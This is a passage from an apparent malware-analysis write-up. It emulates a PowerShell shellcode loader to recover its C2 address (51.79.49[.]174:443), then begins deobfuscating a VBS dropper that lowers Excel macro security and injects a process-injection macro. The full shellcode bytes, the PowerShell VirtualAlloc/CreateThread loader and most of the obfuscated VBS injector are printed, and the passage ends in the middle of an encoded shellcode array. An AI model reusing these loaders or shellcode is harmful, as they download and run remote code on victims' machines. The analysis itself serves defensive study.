0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x33,0x4f,0x31,0xae,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$Ud = 0x1000;if ($aN.Length -gt 0x1000){$Ud =
$aN.Length};$mM=$gL::VirtualAlloc(0,0x1000,$Ud,0x40);for ($Bw=0;$Bw -le ($aN.Length-1);$Bw++) {$gL::memset([IntPtr]($mM.ToInt32()+$Bw), $aN[$Bw], 1)};$gL::CreateThread(0,0,$mM,0,0,0);for (;)
{Start-Sleep 60};';$cF = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($MPm));$pq = "-ec ";if([IntPtr]::Size -eq 8){$Jr = $env:SystemRoot +
"\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $Jr $pq $cF"}else{;iex "& powershell $pq $cF";}
```

There are references to injection APIs such as VirtualAlloc, Memset and CreateThread, which could be an indication that the following hex blob is shellcode.

We can emulate this shellcode by using Speakeasy, we'll save the shellcode from CyberChef and run it against Speakeasy to reveal the following code:

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/038af658-e528-4fc0-a982-88c87b10dc21)

```
* exec: shellcode
0x10a2: 'kernel32.LoadLibraryA("ws2_32")' -> 0x78c00000
0x10b2: 'ws2_32.WSAStartup(0x190, 0x1203e4c)' -> 0x0
0x10c1: 'ws2_32.WSASocketA("AF_INET", "SOCK_STREAM", 0x0, 0x0, 0x0, 0x0)' -> 0x4
0x10db: 'ws2_32.connect(0x4, "51.79.49.174:443", 0x10)' -> 0x0
0x10f8: 'ws2_32.recv(0x4, 0x1203e40, 0x4, 0x0)' -> 0x4
0x110b: 'kernel32.VirtualAlloc(0x0, 0x8, 0x1000, "PAGE_EXECUTE_READWRITE")' -> 0x50000
0x1119: 'ws2_32.recv(0x4, 0x50000, 0x8, 0x0)' -> 0x8
0x50008: Unhandled interrupt: intnum=0x3
0x50008: shellcode: Caught error: unhandled_interrupt
* Finished emulating
```

It looks like this is a downloader, with a C2 address of 51.79.49[.]174:443

## Obfuscated VBS > Shellcode

This second example involves deobfuscating a VBS script to reveal and interrogate Shellcode to find the C2 address.

Initial Script:
```

Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule

Set objExcel = CreateObject("Excel.Application")
objExcel.Visible = False

Set WshShell = CreateObject("Wscript.Shell")

function RegExists(regKey)
	on error resume next
	WshShell.RegRead regKey
	RegExists = (Err.number = 0)
end function

' Get the old AccessVBOM value
RegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & objExcel.Version & "\Excel\Security\AccessVBOM"

if RegExists(RegPath) then
	action = WshShell.RegRead(RegPath)
else
	action = ""
end if

' Weaken the target
WshShell.RegWrite RegPath, 1, "REG_DWORD"

' Run the macro
Set objWorkbook = objExcel.Workbooks.Add()
Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
xlmodule.CodeModule.AddFromString "Private "&"Type PRO"&"CESS_INF"&"ORMATION"&Chr(10)&"    hPro"&"cess As "&"Long"&Chr(10)&"    hThr"&"ead As L"&"ong"&Chr(10)&"    dwPr"&"ocessId "&"As Long"&Chr(10)&"    dwTh"&"readId A"&"s Long"&Chr(10)& _
"End Type"&Chr(10)&Chr(10)&"Private "&"Type STA"&"RTUPINFO"&Chr(10)&"    cb A"&"s Long"&Chr(10)&"    lpRe"&"served A"&"s String"&Chr(10)&"    lpDe"&"sktop As"&" String"&Chr(10)&"    lpTi"&"tle As S"&"tring"& _
Chr(10)&"    dwX "&"As Long"&Chr(10)&"    dwY "&"As Long"&Chr(10)&"    dwXS"&"ize As L"&"ong"&Chr(10)&"    dwYS"&"ize As L"&"ong"&Chr(10)&"    dwXC"&"ountChar"&"s As Lon"&"g"&Chr(10)&"    dwYC"&"ountChar"& _
"s As Lon"&"g"&Chr(10)&"    dwFi"&"llAttrib"&"ute As L"&"ong"&Chr(10)&"    dwFl"&"ags As L"&"ong"&Chr(10)&"    wSho"&"wWindow "&"As Integ"&"er"&Chr(10)&"    cbRe"&"served2 "&"As Integ"&"er"&Chr(10)&"    lpRe"& _
"served2 "&"As Long"&Chr(10)&"    hStd"&"Input As"&" Long"&Chr(10)&"    hStd"&"Output A"&"s Long"&Chr(10)&"    hStd"&"Error As"&" Long"&Chr(10)&"End Type"&Chr(10)&Chr(10)&Chr(35)&"If VBA7 "&"Then"&Chr(10)& _
"    Priv"&"ate Decl"&"are PtrS"&"afe Func"&"tion Cre"&"ateStuff"&" Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"CreateRe"&"moteThre"&"ad"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"&"s Long"&Chr(44)& _
" ByVal l"&"pThreadA"&"ttribute"&"s As Lon"&"g"&Chr(44)&" ByVal d"&"wStackSi"&"ze As Lo"&"ng"&Chr(44)&" ByVal l"&"pStartAd"&"dress As"&" LongPtr"&Chr(44)&" lpParam"&"eter As "&"Long"&Chr(44)&" ByVal d"& _
"wCreatio"&"nFlags A"&"s Long"&Chr(44)&" lpThrea"&"dID As L"&"ong"&Chr(41)&" As Long"&"Ptr"&Chr(10)&"    Priv"&"ate Decl"&"are PtrS"&"afe Func"&"tion All"&"ocStuff "&"Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "& _
Chr(34)&"VirtualA"&"llocEx"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"&"s Long"&Chr(44)&" ByVal l"&"pAddr As"&" Long"&Chr(44)&" ByVal l"&"Size As "&"Long"&Chr(44)&" ByVal f"&"lAllocat"&"ionType "&"As Long"& _
Chr(44)&" ByVal f"&"lProtect"&" As Long"&Chr(41)&" As Long"&"Ptr"&Chr(10)&"    Priv"&"ate Decl"&"are PtrS"&"afe Func"&"tion Wri"&"teStuff "&"Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"WritePro"& _
"cessMemo"&"ry"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"&"s Long"&Chr(44)&" ByVal l"&"Dest As "&"LongPtr"&Chr(44)&" ByRef S"&"ource As"&" Any"&Chr(44)&" ByVal L"&"ength As"&" Long"&Chr(44)&" ByVal L"& _
"engthWro"&"te As Lo"&"ngPtr"&Chr(41)&" As Long"&"Ptr"&Chr(10)&"    Priv"&"ate Decl"&"are PtrS"&"afe Func"&"tion Run"&"Stuff Li"&"b "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"CreatePr"&"ocessA"&Chr(34)& _
" "&Chr(40)&"ByVal lp"&"Applicat"&"ionName "&"As Strin"&"g"&Chr(44)&" ByVal l"&"pCommand"&"Line As "&"String"&Chr(44)&" lpProce"&"ssAttrib"&"utes As "&"Any"&Chr(44)&" lpThrea"&"dAttribu"&"tes As A"&"ny"& _
Chr(44)&" ByVal b"&"InheritH"&"andles A"&"s Long"&Chr(44)&" ByVal d"&"wCreatio"&"nFlags A"&"s Long"&Chr(44)&" lpEnvir"&"onment A"&"s Any"&Chr(44)&" ByVal l"&"pCurrent"&"Director"&"y As Str"&"ing"&Chr(44)& _
" lpStart"&"upInfo A"&"s STARTU"&"PINFO"&Chr(44)&" lpProce"&"ssInform"&"ation As"&" PROCESS"&"_INFORMA"&"TION"&Chr(41)&" As Long"&Chr(10)&Chr(35)&"Else"&Chr(10)&"    Priv"&"ate Decl"&"are Func"&"tion Cre"& _
"ateStuff"&" Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"CreateRe"&"moteThre"&"ad"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"&"s Long"&Chr(44)&" ByVal l"&"pThreadA"&"ttribute"&"s As Lon"&"g"&Chr(44)& _
" ByVal d"&"wStackSi"&"ze As Lo"&"ng"&Chr(44)&" ByVal l"&"pStartAd"&"dress As"&" Long"&Chr(44)&" lpParam"&"eter As "&"Long"&Chr(44)&" ByVal d"&"wCreatio"&"nFlags A"&"s Long"&Chr(44)&" lpThrea"&"dID As L"& _
"ong"&Chr(41)&" As Long"&Chr(10)&"    Priv"&"ate Decl"&"are Func"&"tion All"&"ocStuff "&"Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"VirtualA"&"llocEx"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"& _
"s Long"&Chr(44)&" ByVal l"&"pAddr As"&" Long"&Chr(44)&" ByVal l"&"Size As "&"Long"&Chr(44)&" ByVal f"&"lAllocat"&"ionType "&"As Long"&Chr(44)&" ByVal f"&"lProtect"&" As Long"&Chr(41)&" As Long"&Chr(10)& _
"    Priv"&"ate Decl"&"are Func"&"tion Wri"&"teStuff "&"Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"WritePro"&"cessMemo"&"ry"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"&"s Long"&Chr(44)&" ByVal l"& _
"Dest As "&"Long"&Chr(44)&" ByRef S"&"ource As"&" Any"&Chr(44)&" ByVal L"&"ength As"&" Long"&Chr(44)&" ByVal L"&"engthWro"&"te As Lo"&"ng"&Chr(41)&" As Long"&Chr(10)&"    Priv"&"ate Decl"&"are Func"&"tion Run"& _
"Stuff Li"&"b "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"CreatePr"&"ocessA"&Chr(34)&" "&Chr(40)&"ByVal lp"&"Applicat"&"ionName "&"As Strin"&"g"&Chr(44)&" ByVal l"&"pCommand"&"Line As "&"String"&Chr(44)& _
" lpProce"&"ssAttrib"&"utes As "&"Any"&Chr(44)&" lpThrea"&"dAttribu"&"tes As A"&"ny"&Chr(44)&" ByVal b"&"InheritH"&"andles A"&"s Long"&Chr(44)&" ByVal d"&"wCreatio"&"nFlags A"&"s Long"&Chr(44)&" lpEnvir"& _
"onment A"&"s Any"&Chr(44)&" ByVal l"&"pCurrent"&"Driector"&"y As Str"&"ing"&Chr(44)&" lpStart"&"upInfo A"&"s STARTU"&"PINFO"&Chr(44)&" lpProce"&"ssInform"&"ation As"&" PROCESS"&"_INFORMA"&"TION"&Chr(41)& _
" As Long"&Chr(10)&Chr(35)&"End If"&Chr(10)&Chr(10)&"Sub Auto"&"_Open"&Chr(40)&Chr(41)&Chr(10)&"    Dim "&"myByte A"&"s Long"&Chr(44)&" myArray"&" As Vari"&"ant"&Chr(44)&" offset "&"As Long"&Chr(10)&"    Dim "& _
"pInfo As"&" PROCESS"&"_INFORMA"&"TION"&Chr(10)&"    Dim "&"sInfo As"&" STARTUP"&"INFO"&Chr(10)&"    Dim "&"sNull As"&" String"&Chr(10)&"    Dim "&"sProc As"&" String"&Chr(10)&Chr(10)&Chr(35)&"If VBA7 "& _
"Then"&Chr(10)&"    Dim "&"rwxpage "&"As LongP"&"tr"&Chr(44)&" res As "&"LongPtr"&Chr(10)&Chr(35)&"Else"&Chr(10)&"    Dim "&"rwxpage "&"As Long"&Chr(44)&" res As "&"Long"&Chr(10)&Chr(35)&"End If"&Chr(10)& _
"    myAr"&"ray "&Chr(61)&" Array"&Chr(40)&Chr(45)&"4"&Chr(44)&Chr(45)&"24"&Chr(44)&Chr(45)&"119"&Chr(44)&"0"&Chr(44)&"0"&Chr(44)&"0"&Chr(44)&"96"&Chr(44)&Chr(45)&"119"&Chr(44)&Chr(45)&"27"&Chr(44)&"49"& _
Chr(44)&Chr(45)&"46"&Chr(44)&"100"&Chr(44)&Chr(45)&"117"&Chr(44)&"82"&Chr(44)&"48"&Chr(44)&Chr(45)&"117"&Chr(44)&"82"&Chr(44)&"12"&Chr(44)&Chr(45)&"117"&Chr(44)&"82"&Chr(44)&"20"&Chr(44)&Chr(45)&"117"& _
Chr(44)&"114"&Chr(44)&"40"&Chr(44)&"15"&Chr(44)&Chr(45)&"73"&Chr(44)&"74"&Chr(44)&"38"&Chr(44)&"49"&Chr(44)&Chr(45)&"1"&Chr(44)&"49"&Chr(44)&Chr(45)&"64"&Chr(44)&Chr(45)&"84"&Chr(44)&"60"&Chr(44)&"97"& _
Chr(44)&"124"&Chr(44)&"2"&Chr(44)&"44"&Chr(44)&"32"&Chr(44)&Chr(45)&"63"&Chr(44)&Chr(45)&"49"&Chr(44)&" _"&Chr(10)&"13"&Chr(44)&"1"&Chr(44)&Chr(45)&"57"&Chr(44)&Chr(45)&"30"&Chr(44)&Chr(45)&"16"&Chr(44)& _
"82"&Chr(44)&"87"&Chr(44)&Chr(45)&"117"&Chr(44)&"82"&Chr(44)&"16"&Chr(44)&Chr(45)&"117"&Chr(44)&"66"&Chr(44)&"60"&Chr(44)&"1"&Chr(44)&Chr(45)&"48"&Chr(44)&Chr(45)&"117"&Chr(44)&"64"&Chr(44)&"120"&Chr(44)& _
Chr(45)&"123"&Chr(44)&Chr(45)&"64"&Chr(44)&"116"&Chr(44)&"74"&Chr(44)&"1"&Chr(44)&Chr(45)&"48"&Chr(44)&"80"&Chr(44)&Chr(45)&"117"&Chr(44)&"72"&Chr(44)&"24"&Chr(44)&Chr(45)&"117"&Chr(44)&"88"&Chr(44)&"32"& _
Chr(44)&"1"&Chr(44)&Chr(45)&"45"&Chr(44)&Chr(45)&"29"&Chr(44)&"60"&Chr(44)&"73"&Chr(44)&Chr(45)&"117"&Chr(44)&"52"&Chr(44)&Chr(45)&"117"&Chr(44)&"1"&Chr(44)&" _"&Chr(10)&Chr(45)&"42"&Chr(44)&"49"&Chr(44)& _
Chr(45)&"1"&Chr(44)&"49"&Chr(44)&Chr(45)&"64"&Chr(44)&Chr(45)&"84"&Chr(44)&Chr(45)&"63"&Chr(44)&Chr(45)&"49"&Chr(44)&"13"&Chr(44)&"1"&Chr(44)&Chr(45)&"57"&Chr(44)&"56"&Chr(44)&Chr(45)&"32"&Chr(44)&"117"& _
Chr(44)&Chr(45)&"12"&Chr(44)&"3"&Chr(44)&"125"&Chr(44)&Chr(45)&"8"&Chr(44)&"59"&Chr(44)&"125"&Chr(44)&"36"&Chr(44)&"117"&Chr(44)&Chr(45)&"30"&Chr(44)&"88"&Chr(44)&Chr(45)&"117"&Chr(44)&"88"&Chr(44)&"36"& _
Chr(44)&"1"&Chr(44)&Chr(45)&"45"&Chr(44)&"102"&Chr(44)&Chr(45)&"117"&Chr(44)&"12"&Chr(44)&"75"&Chr(44)&Chr(45)&"117"&Chr(44)&"88"&Chr(44)&"28"&Chr(44)&"1"&Chr(44)&Chr(45)&"45"&Chr(44)&Chr(45)&"117"&Chr(44)& _
"4"&Chr(44)&" _"&Chr(10)&Chr(45)&"117"&Chr(44)&"1"&Chr(44)&Chr(45)&"48"&Chr(44)&Chr(45)&"119"&Chr(44)&"68"&Chr(44)&"36"&Chr(44)&"36"&Chr(44)&"91"&Chr(44)&"91"&Chr(44)&"97"&Chr(44)&"89"&Chr(44)&"90"&Chr(44)& _
"81"&Chr(44)&Chr(45)&"1"&Chr(44)&Chr(45)&"32"&Chr(44)&"88"&Chr(44)&"95"&Chr(44)&"90"&Chr(44)&Chr(45)&"117"&Chr(44)&"18"&Chr(44)&Chr(45)&"21"&Chr(44)&Chr(45)&"122"&Chr(44)&"93"&Chr(44)&"104"&Chr(44)&"110"& _
Chr(44)&"101"&Chr(44)&"116"&Chr(44)&"0"&Chr(44)&"104"&Chr(44)&"119"&Chr(44)&"105"&Chr(44)&"110"&Chr(44)&"105"&Chr(44)&"84"&Chr(44)&"104"&Chr(44)&"76"&Chr(44)&"119"&Chr(44)&"38"&Chr(44)&"7"&Chr(44)&Chr(45)& _
"1"&Chr(44)&" _"&Chr(10)&Chr(45)&"43"&Chr(44)&"49"&Chr(44)&Chr(45)&"1"&Chr(44)&"87"&Chr(44)&"87"&Chr(44)&"87"&Chr(44)&"87"&Chr(44)&"87"&Chr(44)&"104"&Chr(44)&"58"&Chr(44)&"86"&Chr(44)&"121"&Chr(44)&Chr(45)& _
"89"&Chr(44)&Chr(45)&"1"&Chr(44)&Chr(45)&"43"&Chr(44)&Chr(45)&"23"&Chr(44)&Chr(45)&"124"&Chr(44)&"0"&Chr(44)&"0"&Chr(44)&"0"&Chr(44)&"91"&Chr(44)&"49"&Chr(44)&Chr(45)&"55"&Chr(44)&"81"&Chr(44)&"81"&Chr(44)& _
"106"&Chr(44)&"3"&Chr(44)&"81"&Chr(44)&"81"&Chr(44)&"104"&Chr(44)&"91"&Chr(44)&Chr(45)&"22"&Chr(44)&"0"&Chr(44)&"0"&Chr(44)&"83"&Chr(44)&"80"&Chr(44)&"104"&Chr(44)&"87"&Chr(44)&Chr(45)&"119"&Chr(44)&Chr(45)& _
"97"&Chr(44)&" _"&Chr(10)&Chr(45)&"58"&Chr(44)&Chr(45)&"1"&Chr(44)&Chr(45)&"43"&Chr(44)&Chr(45)&"21"&Chr(44)&"112"&Chr(44)&"91"&Chr(44)&"49"&Chr(44)&Chr(45)&"46"&Chr(44)&"82"&Chr(44)&"104"&Chr(44)&"0"& _
Chr(44)&"2"&Chr(44)&"64"&Chr(44)&Chr(45)&"124"&Chr(44)&"82"&Chr(44)&"82"&Chr(44)&"82"&Chr(44)&"83"&Chr(44)&"82"&Chr(44)&"80"&Chr(44)&"104"&Chr(44)&Chr(45)&"21"&Chr(44)&"85"&Chr(44)&"46"&Chr(44)&"59"&Chr(44)& _
Chr(45)&"1"&Chr(44)&Chr(45)&"43"&Chr(44)&Chr(45)&"119"&Chr(44)&Chr(45)&"58"&Chr(44)&Chr(45)&"125"&Chr(44)&Chr(45)&"61"&Chr(44)&"80"&Chr(44)&"49"&Chr(44)&Chr(45)&"1"&Chr(44)&"87"&Chr(44)&"87"&Chr(44)&"106"& _
Chr(44)&Chr(45)&"1"&Chr(44)&"83"&Chr(44)&"86"&Chr(44)&" _"&Chr(10)&"104"&Chr(44)&"45"&Chr(44)&"6"&Chr(44)&"24"&Chr(44)&"123"&Chr(44)&Chr(45)&"1"&Chr(44)&Chr(45)&"43"&Chr(44)&Chr(45)&"123"&Chr(44)&Chr(45)& _
"64"&Chr(44)&"15"&Chr(44)&Chr(45)&"124"&Chr(44)&Chr(45)&"61"&Chr(44)&"1"&Chr(44)&"0"&Chr(44)&"0"&Chr(44)&"49"&Chr(44)&Chr(45)&"1"&Chr(44)&Chr(45)&"123"&Chr(44)&Chr(45)&"10"&Chr(44)&"116"&Chr(44)&"4"&Chr(44)& _
Chr(45)&"119"&Chr(44)&Chr(45)&"7"&Chr(44)&Chr(45)&"21"&Chr(44)&"9"&Chr(44)&"104"&Chr(44)&Chr(45)&"86"&Chr(44)&Chr(45)&"59"&Chr(44)&Chr(45)&"30"&Chr(44)&"93"&Chr(44)&Chr(45)&"1"&Chr(44)&Chr(45)&"43"&Chr(44)& _
Chr(45)&"119"&Chr(44)&Chr(45)&"63"&Chr(44)&"104"&Chr(44)&"69"&Chr(44)&"33"&Chr(44)&"94"&Chr(44)&"49"&Chr(44)&Chr(45)&"1"&Chr(44)&" _"&Chr(10)&Chr(45)&"43"&Chr(44)&"49"&Chr(44)&Chr(45)&"1"&Chr(44)&"87"& _
Chr(44)&"106"&Chr(44)&"7"&Chr(44)&"81"&Chr(44)&"86"&Chr(44)&"80"&Chr(44)&"104"&Chr(44)&Chr(45)&"73"&Chr(44)&"87"&Chr(44)&Chr(45)&"32"&Chr(44)&"11"&Chr(44)&Chr(45)&"1"&Chr(44)&Chr(45)&"43"&Chr(44)&Chr(45)& _
"65"&Chr(44)&"0"&Chr(44)&"47"&Chr(44)&"0"&Chr(44)&"0"&Chr(44)&"57"&Chr(44)&Chr(45)&"57"&Chr(44)&"116"&Chr(44)&Chr(45)&"73"&Chr(44)&"49"&Chr(44)&Chr(45)&"1"&Chr(44)&Chr(45)&"23"&Chr(44)&Chr(45)&"111"&Chr(44)& _
"1"&Chr(44)&"0"&Chr(44)&"0"&Chr(44)&Chr(45)&"23"&Chr(44)&Chr(45)&"55"&Chr(44)&"1"&Chr(44)&"0"&Chr(44)&"0"&Chr(44)&Chr(45)&"24"&Chr(44)&Chr(45)&"117"&Chr(44)&Chr(45)&"1"&Chr(44)&" _"&Chr(10)&Chr(45)&"1"& _
Chr(44)&Chr(45)&"1"&Chr(44)&"47"&Chr(44)&"71"&Chr(44)&"100"&Chr(44)&"97"&Chr(44)&"80"&Chr(44)&"0"&Chr(44)&"53"&Chr(44)&"79"&Chr(44)&"33"&Chr(44)&"80"&Chr(44)&"37"&Chr(44)&"64"&Chr(44)&"65"&Chr(44)&"80"& _
Chr(44)&"91"&Chr(44)&"52"&Chr(44)&"92"&Chr(44)&"80"&Chr(44)&"90"&Chr(44)&"88"&Chr(44)&"53"&Chr(44)&"52"&Chr(44)&"40"&Chr(44)&"80"&Chr(44)&"94"&Chr(44)&"41"&Chr(44)&"55"&Chr(44)&"67"&Chr(44)&"67"&Chr(44)& _
"41"&Chr(44)&"55"&Chr(44)&"125"&Chr(44)&"36"&Chr(44)&"69"&Chr(44)&"73"&Chr(44)&"67"&Chr(44)&"65"&Chr(44)&"82"&Chr(44)&" _"&Chr(10)&"45"&Chr(44)&"83"&Chr(44)&"84"&Chr(44)&"65"&Chr(44)&"78"&Chr(44)&"68"& _
Chr(44)&"65"&Chr(44)&"82"&Chr(44)&"68"&Chr(44)&"45"&Chr(44)&"65"&Chr(44)&"78"&Chr(44)&"84"&Chr(44)&"73"&Chr(44)&"86"&Chr(44)&"73"&Chr(44)&"82"&Chr(44)&"85"&Chr(44)&"83"&Chr(44)&"45"&Chr(44)&"84"&Chr(44)& _
"69"&Chr(44)&"83"&Chr(44)&"84"&Chr(44)&"45"&Chr(44)&"70"&Chr(44)&"73"&Chr(44)&"76"&Chr(44)&"69"&Chr(44)&"33"&Chr(44)&"36"&Chr(44)&"72"&Chr(44)&"43"&Chr(44)&"72"&Chr(44)&"42"&Chr(44)&"0"&Chr(44)&"53"&Chr(44)& _
"79"&Chr(44)&"33"&Chr(44)&"80"&Chr(44)&" _"&Chr(10)&"37"&Chr(44)&"0"&Chr(44)&"85"&Chr(44)&"115"&Chr(44)&"101"&Chr(44)&"114"&Chr(44)&"45"&Chr(44)&"65"&Chr(44)&"103"&Chr(44)&"101"&Chr(44)&"110"&Chr(44)&"116"& _
Chr(44)&"58"&Chr(44)&"32"&Chr(44)&"77"&Chr(44)&"111"&Chr(44)&"122"&Chr(44)&"105"&Chr(44)&"108"&Chr(44)&"108"&Chr(44)&"97"&Chr(44)&"47"&Chr(44)&"52"&Chr(44)&"46"&Chr(44)&"48"&Chr(44)&"32"&Chr(44)&"40"&Chr(44)& _
"99"&Chr(44)&"111"&Chr(44)&"109"&Chr(44)&"112"&Chr(44)&"97"&Chr(44)&"116"&Chr(44)&"105"&Chr(44)&"98"&Chr(44)&"108"&Chr(44)&"101"&Chr(44)&"59"&Chr(44)&"32"&Chr(44)&"77"&Chr(44)&" _"&Chr(10)&"83"&Chr(44)& _
"73"&Chr(44)&"69"&Chr(44)&"32"&Chr(44)&"56"&Chr(44)&"46"&Chr(44)&"48"&Chr(44)&"59"&Chr(44)&"32"&Chr(44)&"87"&Chr(44)&"105"&Chr(44)&"110"&Chr(44)&"100"&Chr(44)&"111"&Chr(44)&"119"&Chr(44)&"115"&Chr(44)& _
"32"&Chr(44)&"78"&Chr(44)&"84"&Chr(44)&"32"&Chr(44)&"53"&Chr(44)&"46"&Chr(44)&"49"&Chr(44)&"59"&Chr(44)&"32"&Chr(44)&"84"&Chr(44)&"114"&Chr(44)&"105"&Chr(44)&"100"&Chr(44)&"101"&Chr(44)&"110"&Chr(44)&"116"& _
Chr(44)&"47"&Chr(44)&"52"&Chr(44)&"46"&Chr(44)&"48"&Chr(44)&"59"&Chr(44)&"32"&Chr(44)&"71"&Chr(44)&"84"&Chr(44)&" _"&Chr(10)&"66"&Chr(44)&"55"&Chr(44)&"46"&Chr(44)&"52"&Chr(44)&"59"&Chr(44)&"32"&Chr(44)& _
"46"&Chr(44)&"78"&Chr(44)&"69"&Chr(44)&"84"&Chr(44)&"52"&Chr(44)&"46"&Chr(44)&"48"&Chr(44)&"67"&Chr(44)&"41"&Chr(44)&"13"&Chr(44)&"10"&Chr(44)&"0"&Chr(44)&"53"&Chr(44)&"79"&Chr(44)&"33"&Chr(44)&"80"&Chr(44)& _
"37"&Chr(44)&"64"&Chr(44)&"65"&Chr(44)&"80"&Chr(44)&"91"&Chr(44)&"52"&Chr(44)&"92"&Chr(44)&"80"&Chr(44)&"90"&Chr(44)&"88"&Chr(44)&"53"&Chr(44)&"52"&Chr(44)&"40"&Chr(44)&"80"&Chr(44)&"94"&Chr(44)&"41"&Chr(44)& _
"55"&Chr(44)&"67"&Chr(44)&" _"&Chr(10)&"67"&Chr(44)&"41"&Chr(44)&"55"&Chr(44)&"125"&Chr(44)&"36"&Chr(44)&"69"&Chr(44)&"73"&Chr(44)&"67"&Chr(44)&"65"&Chr(44)&"82"&Chr(44)&"45"&Chr(44)&"83"&Chr(44)&"84"& _
Chr(44)&"65"&Chr(44)&"78"&Chr(44)&"68"&Chr(44)&"65"&Chr(44)&"82"&Chr(44)&"68"&Chr(44)&"45"&Chr(44)&"65"&Chr(44)&"78"&Chr(44)&"84"&Chr(44)&"73"&Chr(44)&"86"&Chr(44)&"73"&Chr(44)&"82"&Chr(44)&"85"&Chr(44)& _
"83"&Chr(44)&"45"&Chr(44)&"84"&Chr(44)&"69"&Chr(44)&"83"&Chr(44)&"84"&Chr(44)&"45"&Chr(44)&"70"&Chr(44)&"73"&Chr(44)&"76"&Chr(44)&"69"&Chr(44)&"33"&Chr(44)&" _"&Chr(10)&"36"&Chr(44)&"72"&Chr(44)&"43"&Chr(44)& _
"72"&Chr(44)&"42"&Chr(44)&"0"&Chr(44)&"53"&Chr(44)&"79"&Chr(44)&"33"&Chr(44)&"80"&Chr(44)&"37"&Chr(44)&"64"&Chr(44)&"65"&Chr(44)&"80"&Chr(44)&"91"&Chr(44)&"52"&Chr(44)&"92"&Chr(44)&"80"&Chr(44)&"90"&Chr(44)& _
"88"&Chr(44)&"53"&Chr(44)&"52"&Chr(44)&"40"&Chr(44)&"80"&Chr(44)&"94"&Chr(44)&"41"&Chr(44)&"55"&Chr(44)&"67"&Chr(44)&"67"&Chr(44)&"41"&Chr(44)&"55"&Chr(44)&"125"&Chr(44)&"36"&Chr(44)&"69"&Chr(44)&"73"& _
Chr(44)&"67"&Chr(44)&"65"&Chr(44)&"82"&Chr(44)&"45"&Chr(44)&"83"&Chr(44)&" _"&Chr(10)&"84"&Chr(44)&"65"&Chr(44)&"78"&Chr(44)&"68"&Chr(44)&"65"&Chr(44)&"82"&Chr(44)&"68"&Chr(44)&"45"&Chr(44)&"65"&Chr(44)& _
"78"&Chr(44)&"84"&Chr(44)&"73"&Chr(44)&"86"&Chr(44)&"73"&Chr(44)&"82"&Chr(44)&"85"&Chr(44)&"83"&Chr(44)&"45"&Chr(44)&"84"&Chr(44)&"69"&Chr(44)&"83"&Chr(44)&"84"&Chr(44)&"45"&Chr(44)&"70"&Chr(44)&"73"&Chr(44)& _
"76"&Chr(44)&"69"&Chr(44)&"33"&Chr(44)&"36"&Chr(44)&"72"&Chr(44)&"43"&Chr(44)&"72"&Chr(44)&"42"&Chr(44)&"0"&Chr(44)&"53"&Chr(44)&"79"&Chr(44)&"33"&Chr(44)&"80"&Chr(44)&"37"&Chr(44)&"64"&Chr(44)&" _"&Chr(10)& _
